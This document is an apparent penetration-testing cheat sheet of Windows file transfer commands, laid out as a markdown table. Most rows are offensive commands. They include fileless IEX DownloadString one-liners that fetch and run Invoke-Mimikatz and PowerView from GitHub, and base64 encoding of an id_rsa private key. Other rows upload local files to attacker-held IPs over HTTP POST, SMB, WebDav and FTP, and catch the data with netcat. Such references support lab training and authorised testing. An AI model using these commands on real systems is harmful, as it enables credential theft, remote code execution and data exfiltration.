# File Transfers

### Windows File Transfer Methods

| **Command** | **Description** |
| --------------|-------------------|
| **MD and Base64 File encoding** | |
| `md5sum id_rsa` | Checks md value of a file in linux |
| `cat id_rsa \|base64 -w 0;echo` | File to base64 - encode from linux |
| `[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))` | Encode File Using PowerShell |
| `echo BASE64STRING \| base64 -d > hosts` | Decode Base64 String in Linux |
| **File download in windows** | |
| `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("Base 64 string"))` | Decoding the base64 string in windows -PWSH |
| `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5` | Checking the md value of a file in windows -PWSH |
| `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')` **OR** `(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') \| IEX` | PowerShell DownloadString - Fileless Method -PWSH |
| `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1` | From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. -PWSH |
| `Invoke-WebRequest https://<ip>/PowerView.ps1 \| IEX` | There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter -UseBasicParsing. -PWSH |
| `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')` | Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command -PWSH |
| **SMB File Sharing** | |
| `sudo impacket-smbserver share -smb2support /tmp/smbshare` **OR** `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test` | We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with smbserver.py from Impacket |
| `copy \\192.168.220.133\share\nc.exe` **OR** `net use n: \\192.168.220.133\share /user:test test`| Copy a File from the SMB Server -CMD |
| **FTP File Sharing** | |
| `sudo pip3 install pyftpdlib` |  Installing the FTP Server Python3 Module - pyftpdlib |
| `sudo python3 -m pyftpdlib --port 21` | Setting up a Python3 FTP Server |
| `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')` |  Transfering Files from an FTP Server Using PowerShell |
| **PowerShell Web Uploads** | |
| `pip3 install uploadserver` | Installing a Configured WebServer with Upload |
| `python3 -m uploadserver` | Installing a Configured WebServer with Upload |
| `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')` | PowerShell Script to Upload a File to Python Upload Server |
| `Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts` | Uploading the file using the script |
| **PowerShell Base64 Web Upload** | |
| `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))` | PowerShell Script to Upload a File to Python Upload Server |
| `Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64` | Uploading the file using Powershell script |
| `nc -lvnp 8000` | We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file. |
| `echo <base64> \| base64 -d -w 0 \> hosts` | Decoding |
| **SMB Uploads** | |
| `sudo pip install wsgidav cheroot` |  Installing WebDav Python modules | 
| `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous` | Using the WebDav Python module |
| `dir \\192.168.49.128\DavWWWRoot` | Connecting to the Webdav Share -CMD |
| `copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\` | Uploading Files using SMB |
| **FTP Uploads** | |
| `sudo python3 -m pyftpdlib --port 21 --write` | Starting the upload server |
| `(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')` | PowerShell Upload File using ftp |
